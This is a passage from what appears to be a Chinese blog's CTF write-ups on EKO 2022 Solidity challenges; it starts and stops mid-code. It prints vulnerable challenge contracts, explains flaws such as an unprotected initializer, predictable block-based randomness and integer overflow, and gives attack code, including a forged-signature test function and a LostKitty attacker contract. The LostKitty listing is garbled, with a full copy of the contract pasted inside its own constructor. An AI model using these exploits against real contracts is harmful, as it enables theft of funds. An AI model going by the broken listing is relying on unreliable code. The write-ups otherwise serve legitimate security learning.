cp;</span><br><span class="line">    <span class="keyword">constructor</span>(address v)&#123;</span><br><span class="line">        verifier = Verifier(v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">purchaseWithCoupon</span>(<span class="params">SignedCoupon calldata scoupon</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        <span class="built_in">require</span>(coupon.user == msg.sender, <span class="string">"Invalid user"</span>);</span><br><span class="line">        <span class="built_in">require</span>(coupon.newprice &gt; <span class="number">0</span>, <span class="string">"Invalid price"</span>);</span><br><span class="line">        verifier.verifyCoupon(scoupon);</span><br><span class="line">        cp = coupon;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        Coupon memory c;</span><br><span class="line">        c.orderId = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        c.newprice = <span class="number">1</span>;</span><br><span class="line">        c.issuer = address(<span class="number">0x123456</span>);</span><br><span class="line">        c.user = address(<span class="keyword">this</span>);</span><br><span class="line">        c.reason = <span class="string">'lalalalalaallalalalaalallalalalalalalalaalaalalala'</span>;</span><br><span class="line">        SignedCoupon memory scoupon;</span><br><span class="line">        scoupon.coupon = c;</span><br><span class="line"></span><br><span class="line">        Signature memory sig;</span><br><span class="line">        sig.v = <span class="number">17</span>;</span><br><span class="line">        sig.rs[<span class="number">1</span>] = bytes32(<span class="number">0</span>);</span><br><span class="line">        sig.rs[<span class="number">0</span>] = bytes32(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        scoupon.signature = sig;</span><br><span class="line">        caller(<span class="keyword">this</span>).purchaseWithCoupon(scoupon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用test，在remix上测试结果如下：</p><p><img src="https://s3cunda.github.io/assets/post/nft.png" alt="image-20220919130423963"></p><p>可以看到，orderId确实是被改成0了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-EKO-Trickster</title>
      <link href="/EKO-Trickster&amp;LostKitty/"/>
      <url>/EKO-Trickster&amp;LostKitty/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-EKO-Trickster-amp-LostKitty"><a href="#CTF-EKO-Trickster-amp-LostKitty" class="headerlink" title="CTF-EKO-Trickster&amp;LostKitty"></a>CTF-EKO-Trickster&amp;LostKitty</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h2><p>题目描述与源码：</p><blockquote><p>我们可能已经发现了一个蜜罐……你能设法获得真正的头奖吗？。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line">contract Jackpot &#123;</span><br><span class="line">    address private jackpotProxy;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params">address _jackpotProxy</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        jackpotProxy = _jackpotProxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyJackpotProxy() &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == jackpotProxy);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">claimPrize</span>(<span class="params">uint256 amount</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">onlyJackpotProxy</span> </span>&#123;</span><br><span class="line">        payable(msg.sender).transfer(amount * <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract JackpotProxy &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    address private jackpot;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        address _proxy = address(<span class="keyword">new</span> Jackpot());</span><br><span class="line">        initialize(_proxy);</span><br><span class="line">        payable(_proxy).transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">initialize</span>(<span class="params">address _jackpot</span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">        jackpot = _jackpot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">claimPrize</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span>, <span class="string">"zero deposit"</span>);</span><br><span class="line">        (bool success,) = jackpot.call&#123;<span class="attr">value</span>: msg.value&#125;(abi.encodeWithSignature(<span class="string">"claimPrize(uint)"</span>, msg.value));</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">"failed"</span>);</span><br><span class="line">        payable(msg.sender).transfer(address(<span class="keyword">this</span>).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balance</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> jackpot.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个challange的逻辑是用户调用<code>JackpotProxy</code>的<code>claimPrize</code>方法来兑奖，<code>Jackpot</code>合约在收到代理合约的请求后把ETH转给代理合约，最后代理把ETH转给中奖者。</p><p>但这个题的<code>Jackpot</code>合约的<code>initialize</code>并没有被调用，而此函数又是一个public函数，此合约的<code>claimPrize</code>明显验证不足，我们可以直接调用此函数来盗取大奖。唯一的问题就是去获取<code>jackpot</code>这个私有变量。</p><p>这个challange过于简单，我们接着看下一题。</p><p>附Factory：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">address</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address[] memory ret</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value == <span class="number">0.0001</span> ether, <span class="string">"Please pay 0.0001 ether"</span>);</span><br><span class="line">    address _challenge = address(<span class="keyword">new</span> JackpotProxy&#123;<span class="attr">value</span>: msg.value&#125;());</span><br><span class="line">    ret = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">    ret[<span class="number">0</span>] = _challenge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params">address[] calldata _challenges</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// @dev to win this challenge you must drain the contract</span></span><br><span class="line">    <span class="keyword">return</span> JackpotProxy(payable(_challenges[<span class="number">0</span>])).balance() == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LostKitty"><a href="#LostKitty" class="headerlink" title="LostKitty"></a>LostKitty</h2><p>题目描述与源码：</p><blockquote><p>卢卡斯是一位科学家，他和他的猫住在一个有 2^256 个房间的大房子里。他的猫喜欢玩捉迷藏，只要听到另一个房间开门，它就会跳到一个随机房间。你能找到卢卡斯的猫吗？将变量设置<code>catFound</code>为<code>true</code>以赢得此挑战。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract HiddenKittyCat &#123;</span><br><span class="line">    address private immutable _owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        <span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// @title The Lost Kitty</span></span><br><span class="line"><span class="comment">/// @author https://twitter.com/Cryptonicle1</span></span><br><span class="line"><span class="comment">/// @notice Lucas is a scientist who has lost his cat in a big house that has 2^256 rooms, anon can you find it?</span></span><br><span class="line"><span class="comment">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hidden-kittycat</span></span><br><span class="line">contract HiddenKittyCat &#123;</span><br><span class="line">    address private immutable _owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - <span class="number">69</span>)));</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(slot, <span class="string">"KittyCat!"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">areYouHidingHere</span>(<span class="params">bytes32 slot</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == _owner, <span class="string">"!owner"</span>);</span><br><span class="line">        bytes32 kittyPointer;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            kittyPointer := sload(slot)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> kittyPointer == <span class="string">"KittyCat!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destroyMe</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == _owner, <span class="string">"!owner"</span>);</span><br><span class="line">        selfdestruct(payable(address(<span class="number">0</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract House &#123;</span><br><span class="line">    bool public catFound;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isKittyCatHere</span>(<span class="params">bytes32 _slot</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (catFound) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HiddenKittyCat hiddenKittyCat = <span class="keyword">new</span> HiddenKittyCat();</span><br><span class="line">        bool found = hiddenKittyCat.areYouHidingHere(_slot);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            hiddenKittyCat.destroyMe();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            catFound = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(slot, <span class="string">"KittyCat!"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">areYouHidingHere</span>(<span class="params">bytes32 slot</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == _owner, <span class="string">"!owner"</span>);</span><br><span class="line">        bytes32 kittyPointer;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            kittyPointer := sload(slot)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> kittyPointer == <span class="string">"KittyCat!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destroyMe</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == _owner, <span class="string">"!owner"</span>);</span><br><span class="line">        selfdestruct(payable(address(<span class="number">0</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract House &#123;</span><br><span class="line">    bool public catFound;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isKittyCatHere</span>(<span class="params">bytes32 _slot</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (catFound) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HiddenKittyCat hiddenKittyCat = <span class="keyword">new</span> HiddenKittyCat();</span><br><span class="line">        bool found = hiddenKittyCat.areYouHidingHere(_slot);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            hiddenKittyCat.destroyMe();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            catFound = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题的本质应该是想考查交易的原子性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 slot &#x3D; keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));</span><br></pre></td></tr></table></figure><p>slot其实是根据这个区块的信息计算出来的，看似是个随机数，但在这个合约创建时的区块内的所有交易都共享同一个区块数据。</p><p>因此写出攻击合约如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../ChallengeHiddenKitty.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract HiddenKittyCatAttacker &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(address target) &#123;</span><br><span class="line">        bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - <span class="number">69</span>)));</span><br><span class="line">        House house = House(target);</span><br><span class="line">        house.isKittyCatHere(slot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GoldenTicket"><a href="#GoldenTicket" class="headerlink" title="GoldenTicket"></a>GoldenTicket</h2><p>题目描述与源码：</p><blockquote><p>Ekoparty 的组织者决定 2023 年会议的门票将通过智能合约购买。但是，会议超卖，您必须注册等候名单才能拿到票。问题是他们让你等了十年，而你唯一的选择就是延长等待时间。等待结束后，你必须进入抽奖，看看你是否获得了门票</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line">contract GoldenTicket &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint40) public waitlist;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> bool) public hasTicket;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">joinWaitlist</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(waitlist[msg.sender] == <span class="number">0</span>, <span class="string">"Already on waitlist"</span>);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            <span class="comment">///@dev 10 years wait list</span></span><br><span class="line">            waitlist[msg.sender] = uint40(block.timestamp + <span class="number">10</span> * <span class="number">365</span> days);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">updateWaitTime</span>(<span class="params">uint256 _time</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(waitlist[msg.sender] != <span class="number">0</span>, <span class="string">"Join waitlist first"</span>);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            waitlist[msg.sender] += uint40(_time);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">joinRaffle</span>(<span class="params">uint256 _guess</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(waitlist[msg.sender] != <span class="number">0</span>, <span class="string">"Not in waitlist"</span>);</span><br><span class="line">        <span class="built_in">require</span>(waitlist[msg.sender] &lt;= block.timestamp, <span class="string">"Still have to wait"</span>);</span><br><span class="line">        <span class="built_in">require</span>(!hasTicket[msg.sender], <span class="string">"Already have a ticket"</span>);</span><br><span class="line">        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - <span class="number">1</span>), block.timestamp)));</span><br><span class="line">        <span class="keyword">if</span> (randomNumber == _guess) &#123;</span><br><span class="line">            hasTicket[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span> waitlist[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">giftTicket</span>(<span class="params">address _to</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(hasTicket[msg.sender], <span class="string">"Yoy dont own a ticket"</span>);</span><br><span class="line">        hasTicket[msg.sender] = <span class="literal">false</span>;</span><br><span class="line">        hasTicket[_to] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个challange也很基础，就是一个简单的算术溢出，在<code>updateWaitTime</code>里面。</p><p>就不多做分析了。</p>]]></content>
      
      
      <categories>
          
          <category> EKO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EKO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-EKO-SmartHorrocrux</title>
      <link href="/EKO-SmartHorrocrux/"/>
      <url>/EKO-SmartHorrocrux/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-EKO-SmartHorrocrux"><a href="#CTF-EKO-SmartHorrocrux" class="headerlink" title="CTF-EKO-SmartHorrocrux"></a>CTF-EKO-SmartHorrocrux</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>先来看题目简介和代码</p><blockquote><p>一些安全研究人员最近发现了第八个魂器，似乎伏地魔与智能合约有联系，你能摧毁它吗？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// @title SmartHorrocrux</span></span><br><span class="line"><span class="comment">/// @author https://twitter.com/AugustitoQ</span></span><br><span class="line"><span class="comment">/// @notice Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?</span></span><br><span class="line"><span class="comment">/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/smart-horrocrux</span></span><br><span class="line">contract SmartHorrocrux &#123;</span><br><span class="line">    bool private invincible;</span><br><span class="line">    bytes32 private constant _spell = <span class="number">0x45746865724b6164616272610000000000000000000000000000000000000000</span>;</span><br><span class="line">    <span class="comment">// var only for test purposes</span></span><br><span class="line">    bool public alive = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == <span class="number">2</span>, <span class="string">"Pay Horrorcrux creation price"</span>);</span><br><span class="line">        setInvincible();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destroyIt</span>(<span class="params">string memory spell, uint256 magic</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        bytes32 spellInBytes;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            spellInBytes := mload(add(spell, <span class="number">32</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">require</span>(spellInBytes == _spell, <span class="string">"That spell wouldn't kill a fly"</span>);</span><br><span class="line">        <span class="built_in">require</span>(!invincible, <span class="string">"The Horrocrux is still invincible"</span>);</span><br><span class="line"></span><br><span class="line">        bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic)));</span><br><span class="line">        address(<span class="keyword">this</span>).call(kedavra);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == address(<span class="keyword">this</span>), <span class="string">"No one can kill me"</span>);</span><br><span class="line">        alive = <span class="literal">false</span>;</span><br><span class="line">        selfdestruct(payable(tx.origin));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setInvincible</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        invincible = (address(<span class="keyword">this</span>).balance == <span class="number">1</span>) ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        uint256 b = address(<span class="keyword">this</span>).balance;</span><br><span class="line">        invincible = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (b &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            tx.origin.call&#123;<span class="attr">value</span>: b&#125;(<span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读完<code>SmartHorrocrux</code>思路好像就挺清晰，大概是通过调用<code>destroyIt</code>去调用kill让合约自毁，只是有一些判断需要通过。让我们看看Factory是不是这样要求的吧：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 